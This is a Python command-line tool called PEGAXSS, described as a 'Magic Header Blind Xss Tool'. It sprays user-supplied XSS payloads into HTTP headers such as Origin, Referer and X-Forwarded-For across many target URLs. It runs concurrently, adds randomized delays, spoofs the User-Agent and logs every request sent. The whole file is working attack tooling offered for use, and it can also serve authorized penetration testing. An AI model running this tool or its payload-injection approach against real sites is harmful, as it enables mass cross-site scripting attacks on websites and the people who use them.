#!/usr/bin/env python3
import json
from urllib.parse import urlparse
import urllib.request
import argparse
from argparse import RawTextHelpFormatter
import sys
import subprocess
import signal,multiprocessing
import random
from termcolor import colored,cprint
import re
import time
import datetime

ASCII=r"""
----------------------------------------------------------------------


                  <<<<>>>>>>           .----------------------------.
                _>><<<<>>>>>>>>>       /               _____________)
       \|/      \<<<<<  < >>>>>>>>>   /            _______________)
 -------*--===<=<<           <<<<<<<>/         _______________)
       /|\     << @    _/      <<<<</       _____________)
              <  \    /  \      >>>/      ________)  ____
                  |  |   |       </      ______)____((- \\\\
                  o_|   /        /      ______)         \  \\\\    \\\\\\\
                       |  ._    (      ______)           \  \\\\\\\\\\\\\\\\
                       | /       `----------'    /       /     \\\\\\\
   
               .______/\/     /                 /       /          \\\
              / __.____/    _/         ________(       /\
             / / / ________/`---------'         \     /  \_
            / /  \ \                             \   \ \_  \
           ( <    \ \                             >  /    \ \
            \/      \\_                          / /       > )
                     \_|                        / /       / /
                                              _//       _//
                                             /_|       /_|


.______    _______   _______      ___      ___   ___      _______.     _______.
|   _  \  |   ____| /  _____|    /   \     \  \ /  /     /       |    /       |
|  |_)  | |  |__   |  |  __     /  ^  \     \  V  /     |   (----`   |   (----`
|   ___/  |   __|  |  | |_ |   /  /_\  \     >   <       \   \        \   \    
|  |      |  |____ |  |__| |  /  _____  \   /  .  \  .----)   |   .----)   |   
| _|      |_______| \______| /__/     \__\ /__/ \__\ |_______/    |_______/    

---------------------------------------------------------------------- 
https://github.com/truffle-dog
https://twitter.com/truffledog6
Do you need kickass security tools? Or security consulting?
Or just want to exchange ideas? 
Contact me on twitter: @truffledog6 (twitter.com/truffledog6)
---------------------------------------------------------------------- 
PEGAXSS - Magic Header Blind Xss Tool
---------------------------------------------------------------------- 
"""

ASCII_MIN=r""" 
----------------------------------------------------------------------
.______    _______   _______      ___      ___   ___      _______.     _______.
|   _  \  |   ____| /  _____|    /   \     \  \ /  /     /       |    /       |
|  |_)  | |  |__   |  |  __     /  ^  \     \  V  /     |   (----`   |   (----`
|   ___/  |   __|  |  | |_ |   /  /_\  \     >   <       \   \        \   \    
|  |      |  |____ |  |__| |  /  _____  \   /  .  \  .----)   |   .----)   |   
| _|      |_______| \______| /__/     \__\ /__/ \__\ |_______/    |_______/    

---------------------------------------------------------------------- 
https://github.com/truffle-dog
https://twitter.com/truffledog6
Do you need kickass security tools? Or security consulting?
Or just want to exchange ideas? 
Contact me on twitter: @truffledog6 (twitter.com/truffledog6)
---------------------------------------------------------------------- 
PEGAXSS - Magic Header Blind Xss Tool
---------------------------------------------------------------------- 
"""


STD_HEADERS=["A-IM","Accept","Accept-Charset","Accept-Encoding","Accept-Language","Acces-Control-Request-Method", "Acces-Control-Request-Headers","Authorization","Cache-Control","Connection","Content-Encoding","Content-Length","Content-MD5","Content-Type","Cookie","Date","Expect","Forwarded","From","Host","HTTP2-Settings","If-Match","If-Modified-Since","If-None-Match","If-Range","If-Unmodified-Since","Max-Forwards","Origin","Pragma", "Proxy-Authorization","Range","Referer","TE","Trailer","Transfer-Encoding","User-Agent","Upgrade","Via","Warning"]
NONSTD_HEADERS=["Upgrade-Insecure-Requests","X-Requested-With","DNT","X-Forwarded-For","X-Forwarded-Host","X-Forwarded-Proto","Front-End-Https","X-Http-Method-Override","X-ATT-DeviceId","X-Wap-Profile","Proxy-Connection","X-UIDH","X-Csrf-Token","X-CSRFToken","X-XSRF-TOKEN","X-Request-ID","X-Correlation-ID","Save-Data"]
DEFAULT_LOCAL_DATAFILE="BlindXssSentRequests.json"
DELAY_AFTER_PRINTING_INTRO_MSG=3

DESCRIPTION="""
************************
Description: 
************************
For each url make a number of requests equal to the number of payloads supplied multiplied by header rows supplied (if the headers are passid directly instead of a file then it counts as one row). During each request the specific payload is assigned to the headers in the header row. 

For each URL:
  For each payload:
    For each header row:
      Assign payload to headers in current header row and perform request.

************************
Example usage:
************************

* for each url deliver payloads in the headers specified
$ pegaxss.py urls.txt -p payloads.txt -H "Origin" 

* same as above but using stdin
$ cat urls.txt | pegaxss.py -p payloads.txt -H "Origin"

* for each url deliver payloads using header rows from file. Headers on each line should be separated by space, without quotes. 

$ pegaxss.py urls.txt -p payloads.txt -H headers.txt

Example: headers.txt
--------------
Origin
Origin Referer
-------------

* specify custom delay and concurency level (number of processes)
$ pegaxss.py urls.txt -p payloads.txt -H "Origin" -d 1 3 -c 10

* specify a custom file to save the details about sent requests (instead of the default file which is %s)
$ pegaxss.py urls.txt -p payloads.txt -H "Origin" -l "custom_datafile.json" 
---------------------------------------------------------------------- 
"""%(DEFAULT_LOCAL_DATAFILE)

def get_args():
  parser=argparse.ArgumentParser(description=ASCII_MIN+DESCRIPTION,formatter_class=RawTextHelpFormatter)
  parser.add_argument('inputfile', nargs='?', type=argparse.FileType('r'), default=(None if sys.stdin.isatty() else sys.stdin),help="Supply an input file as a position argument or pass lines through stdin (cat urls.txt | massblindxss.py)")
  # parser.add_argument("inputfile",help="urls to be requested, one on each line",type=argparse.FileType("r"))
  parser.add_argument("-p",help="xss payloads to be delivered, one on each line",type=argparse.FileType("r"),dest="payloadfile",required=True)
  parser.add_argument("-H","--Headers",help="request headers to infect with payload. Either a file containing headers separated by space on each line OR a variable number of header names",type=str,nargs="+",dest="headers",required=True)
  parser.add_argument("-c","--concurency", help="specify number of threads. Default 32",type=int,default=32,dest="c")
  parser.add_argument("-l", "--local-datafile", help="will write all sent requests to this file. Default %s"%DEFAULT_LOCAL_DATAFILE,type=str,dest="l")
  parser.add_argument("-d","--delay-seconds",help="will add this delay in seconds between each request. Pass two values if you want a rand delay between a min and a max (like -d 0.5 2)",nargs=2,dest="d")
  parser.add_argument("-nv","--no-verbose",help="Disable printing the informational messages at start or end of processing",action="store_true",dest="nv")
  return parser.parse_args()

args=get_args()
urls=payloads=header_rows=local_datafile=minmax_delay=None

def get_urls():
  return list((url.strip() for url in args.inputfile))

def get_payloads():
  return (p.strip() for p in args.payloadfile)

def get_headers():
  header_rows=[]
  if headers_is_file():
    header_rows=read_headers_from_file()
  else:
    word_arr=list(str(h) for h in args.headers)
    header_rows.append(word_arr)
  header_rows=validate_headers(header_rows)
  return header_rows


def validate_headers(header_rows):
  valid_headers=[]
  for row in header_rows:
    valid_row=[h for h in row if (h in STD_HEADERS or h in NONSTD_HEADERS)]
    len(valid_row) >=1 and valid_headers.append(valid_row)
  return valid_headers


def headers_is_file():
  if args.headers !=None and len(args.headers)==1:
    try:
      f=open(args.headers[0])
      return True
    except Exception as e:
      pass
  return False

def read_headers_from_file():
  f=open(args.headers[0])
  lines=f.read().strip().split("\n")
  lines=list(l.strip() for l in lines)
  header_rows=[]
  for l in lines:
    inner_arr=[]
    words=l.split(" ")
    for w in words:
      inner_arr.append(w)
    header_rows.append(inner_arr)
  return header_rows  



def get_local_datafile():
  if args.l and len(args.l)> 0:
    return args.l
  else:
    return DEFAULT_LOCAL_DATAFILE

def get_min_max_delay():
  if not args.d or len(args.d)!=2: 
    args.d=[2,4]
  return list(int(a) for a in args.d)  



def assign_vals_to_globals():
  global urls,payloads,header_rows,local_datafile,minmax_delay
  urls=list(get_urls())
  payloads=list(get_payloads())
  header_rows=list(get_headers())
  local_datafile=get_local_datafile()
  minmax_delay=get_min_max_delay()




def store(url,headers):
  f=open(local_datafile,"a+")
  dt=datetime.datetime.now().strftime('%Y-%m-%dT%H:%M:%S.%f')
  f.write(json.dumps({"url":url,"headers":headers,"time_sent":dt})+"\n")



  # furl=subprocess.check_output(["dhttp"],input=furl.encode()).decode()
  # furl=subprocess.check_output(["ahttp"],input=furl.encode()).decode()





def get_delay_seconds():
  delay=0
  delay=random.randint(minmax_delay[0],minmax_delay[1])
  return delay

def compute_avg_delay():
  avg_delay=(minmax_delay[0]+minmax_delay[1])/2
  return avg_delay

def prepare_url(url):
  url=re.sub("^https?://","",url)
  url="http://"+url
  return url

def create_request(url,headers,payload):
  url=prepare_url(url)
  req=urllib.request.Request(url)
  req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64)')
  for h in headers:
    req.add_header(h,payload)
  return req



def mainop(url):
  url_index=urls.index(url)
  for headers in header_rows:
    for payload in payloads:
        delay=get_delay_seconds()
        time.sleep(delay)
        try: 
          req=create_request(url,headers,payload)
        except Exception as e:
          err("%s - Err occurde while creating request"%url)
          err(str(e))
        
        if len(req.header_items()) <=0:
          warn("Don't have any headers to send. Aborting request of url.")
        else:
          try:
            response=urllib.request.urlopen(req,timeout=10)
            msg="[%d] %s [PAYLOAD]: %s [HEADERS]: %s [RESPONSE]: %d [REASON]: %s "%(url_index,req.full_url,payload,headers,response.status,response.reason)
            if response.status == 200:
              succ(msg)
            else:
              warn(msg)

            try:
              store(req.full_url,req.header_items())
            except Exception as e:
              err("%s -Storing In Local File %s error %s"%(req.full_url,local_datafile,str(e)))


          except Exception as e:
            err("%s -Sending Request Erorr %s"%(req.full_url,str(e)))




def all_args_ok():
  if not args.inputfile:
    err("Supply an input file, either by piping it or as an argument. See help for details.")
    return False
  header_rows=get_headers()
  if len(header_rows)<=0:
    err("Either no headers supplied or their name is misspelled or wrong")
    return False
  return True


def main():
  if not all_args_ok():
    return
  assign_vals_to_globals()
  
  procs=min(abs(int(args.c)), len(urls)) or 1
  sigint_handler=signal.signal(signal.SIGINT,signal.SIG_IGN)
  pool=multiprocessing.Pool(processes=procs)
  signal.signal(signal.SIGINT,sigint_handler)
  #
  if not args.nv:
    print_starting_msg(procs)
    time.sleep(DELAY_AFTER_PRINTING_INTRO_MSG)
  try:
    # pool.map_async(mainop,urls).get(timeout=1000)
    res=pool.map_async(mainop,urls).get()
  except KeyboardInterrupt:
    pool.close()
    pass
  pool.close()
  
def print_starting_msg(procs):
  avg_delay=compute_avg_delay()
  est_total_time_sec=len(urls)*(avg_delay+1)*len(payloads)*len(header_rows)/procs
  total_requests_to_be_made=len(urls)*len(payloads)*len(header_rows)
  total_requests_per_url=len(payloads)*len(header_rows)
  # ty_res=time.gmtime(est_total_time_sec)
  # est_total_time=time.strftime("%y %m %d %H:%M:%S",ty_res)
  est_total_time=str(datetime.timedelta(seconds=est_total_time_sec))
  info(ASCII)

  cprint("ESTIMATED COMPLETION TIME: %s"%est_total_time,"green","on_white",attrs=["bold","dark","reverse"])
  cprint("DETAILS ","grey","on_white",attrs=["bold","dark","reverse"])
  msg="""Urls: %d 
Avg Delay Between Requests(seconds): %.1f 
Concurent Procs: %d
Payloads: %d 
Header Rows: %d
Total requests per URL: %d
Total requests (ALL): %d""" %(len(urls),avg_delay,procs,len(payloads), len(header_rows),total_requests_per_url,total_requests_to_be_made)
  info(msg)
  time.sleep(2)

  cprint("ROWS OF HEADERS TO BE INFECTED","grey","on_cyan",attrs=["bold","dark","reverse"])
  info(header_rows)
  time.sleep(2)
  # for row in header_rows:
  #   msg+=str(row)+"\n"
  cprint("PAYLOADS","grey","on_yellow",attrs=["bold","dark","reverse"])
  info(payloads)
  time.sleep(2)
  # for p in payloads:
  #   msg+='%s\n'%p
  info("---------------------------------------------------------------------- ")
def info(msg):
  sys.stdout.flush()
  print(colored(msg,"white"))

def err(msg):
  sys.stdout.flush()
  print(colored("[X] "+msg,"red"))

def warn(msg):
  sys.stdout.flush()
  print(colored("[!] "+msg,"yellow"))

def succ(msg):
  sys.stdout.flush()
  print(colored("[OK] "+ msg,"green"))




def _dbg():
  # res=headers_is_file()

  # print(res)
  # headers=read_headers_from_file()
  header_rows=get_headers()

if __name__=="__main__":
  main()
  # _dbg()
